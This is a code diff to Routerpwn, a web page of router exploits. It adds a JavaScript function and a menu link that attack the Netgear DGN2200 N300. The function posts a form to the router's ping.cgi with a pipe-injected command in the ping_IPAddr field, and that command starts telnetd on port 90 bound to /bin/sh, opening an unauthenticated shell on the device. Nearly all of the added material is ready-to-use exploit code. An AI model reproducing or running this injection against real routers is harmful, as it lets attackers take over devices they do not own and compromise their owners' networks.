@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.23.244</title>
+		<title>Routerpwn 1.23.245</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -773,6 +773,21 @@ function dgn2200_commandexec(ip)
 	post('http://' + ip + '/ping.cgi', form);
 }
 
+// Netgear DGN2200 N300 - Open Telnet
+function dgn2200_opentelnet(ip)
+{
+	ip = ip || "192.168.0.1";
+	cmd = "|/usr/sbin/telnetd -p 90 -l /bin/sh"
+	form += '<input	type="hidden"	name="IPAddr1"	value="a"/>';
+	form += '<input	type="hidden"	name="IPAddr2"	value="b"/>';
+	form += '<input	type="hidden"	name="IPAddr3"	value="c"/>';
+	form += '<input	type="hidden"	name="IPAddr4"	value="d"/>';
+	form += '<input	type="hidden"	name="ping"	value="xxxx"/>';
+	form += '<input	type="hidden"	name="ping_IPAddr"	value="%7C"' + encodeURI(cmd);
+	form += '"/>';
+	form += '</form>';
+	post('http://' + ip + '/ping.cgi', form);
+}
 
 function wrt160nv2_command(ip)
 {
@@ -3962,6 +3977,13 @@ function belkinwpspin()
 	<div><a href="http://www.exploit-db.com/exploits/31617/">[+]</a></div>
 	<div><a href="javascript:dgn2200_commandexec()">Netgear DGN2200 N300 - Remote Command Execution</a></div>
 	<div><a href="javascript:dgn2200_commandexec(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>02/11/14</div>
+	<div><a href="http://www.exploit-db.com/exploits/31617/">[+]</a></div>
+	<div><a href="javascript:dgn2200_opentelnet()">Netgear DGN2200 N300 - Get Interactive Telnet Shell (Port 90)</a></div>
+	<div><a href="javascript:dgn2200_opentelnet(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 
